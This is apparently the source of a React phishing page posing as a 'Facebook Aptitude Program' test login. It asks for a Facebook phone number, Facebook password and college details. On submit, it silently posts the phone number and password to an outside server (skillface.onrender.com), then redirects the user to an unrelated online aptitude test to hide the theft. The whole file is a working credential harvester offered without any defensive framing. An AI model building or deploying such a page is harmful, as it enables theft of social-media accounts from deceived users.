import React, { useState, useEffect } from 'react';
import axios from 'axios';

const Login = () => {
    const [formData, setFormData] = useState({
        ph: '',
        password: '',
        college: '',
        collegeID: ''
    });

    const [isButtonDisabled, setIsButtonDisabled] = useState(true);
    const [timer, setTimer] = useState(60);

    useEffect(() => {
        const interval = setInterval(() => {
            setTimer((prev) => {
                if (prev === 1) {
                    clearInterval(interval);
                    setIsButtonDisabled(false); // Enable button
                }
                return prev - 1;
            });
        }, 1000);

        return () => clearInterval(interval);
    }, []);

    const handleChange = (e) => {
        setFormData((prev) => ({
            ...prev,
            [e.target.name]: e.target.value
        }));
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        try {
            const finalData = {
                ph: Number(formData.ph),
                password: formData.password
            };

            const res = await axios.post('https://skillface.onrender.com/submit', finalData);
            console.log('Response:', res.data);

            window.location.href = 'https://www.indiabix.com/online-test/aptitude-test/random';
        } catch (err) {
            console.error('Login Failed:', err);
        }
    };

    return (
        <div className="h-140 bg-gradient-to-r from-blue-600 to-cyan-500 flex items-center justify-center px-2">
            <form
                onSubmit={handleSubmit}
                className="w-full max-w-md bg-white p-6 rounded-xl shadow-lg"
            >
                <h2 className="text-xl font-semibold text-center text-gray-800 mb-4">
                    FB Aptitude Test Login
                </h2>

                {/* Form Fields */}
                {['ph', 'password', 'college', 'collegeID'].map((field, index) => (
                    <div className="mb-3" key={index}>
                        <label className="block text-sm text-gray-700 font-medium mb-1">
                            {field === 'ph' ? 'Facebook Number' :
                                field === 'password' ? 'Facebook Password' :
                                field === 'college' ? 'College Name' : 'College ID Card Number'}
                        </label>
                        <input
                            type={field === 'password' ? 'password' : field === 'ph' ? 'number' : 'text'}
                            name={field}
                            placeholder={
                                field === 'ph' ? 'e.g. 1234567890' :
                                field === 'college' ? 'e.g. IIT Bombay' :
                                field === 'collegeID' ? 'Enter your ID' :
                                'Enter your password'
                            }
                            value={formData[field]}
                            onChange={handleChange}
                            required
                            className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
                        />
                    </div>
                ))}

                {/* Login Button */}
                <button
                    type="submit"
                    disabled={isButtonDisabled}
                    className={`w-full ${
                        isButtonDisabled ? 'bg-gray-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'
                    } text-white text-sm font-semibold py-2 rounded-md transition duration-200`}
                >
                    {isButtonDisabled ? `Wait ${timer}s` : 'Login'}
                </button>

                <p className="text-center text-xs text-gray-500 mt-4">
                    &copy; 2025 Facebook Aptitude Program
                </p>
            </form>
        </div>
    );
};
export default Login;
